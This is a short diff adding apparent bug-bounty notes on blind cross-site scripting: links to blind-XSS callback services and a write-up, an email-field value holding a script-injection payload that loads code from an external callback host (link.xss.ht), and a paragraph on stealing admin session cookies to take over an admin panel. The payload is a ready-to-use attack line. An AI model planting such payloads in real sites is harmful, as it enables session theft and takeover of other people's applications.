@@ -1,0 +1,6 @@
+https://bxsshunter.com/
+https://xss.report/
+https://medium.com/@cyberali/blind-xss-and-time-based-sql-injection-to-admin-panel-control-and-database-takeover-9b7645a53748 xyz@gmail.com “><script src=https://link.xss.ht></script>
+
+
+An attacker exploiting this vulnerability could gain access to sensitive information, compromise the admin panel, and potentially take control of the application. The attacker could also use the stolen admin session cookies to access the admin panel and perform actions on behalf of the admin. 
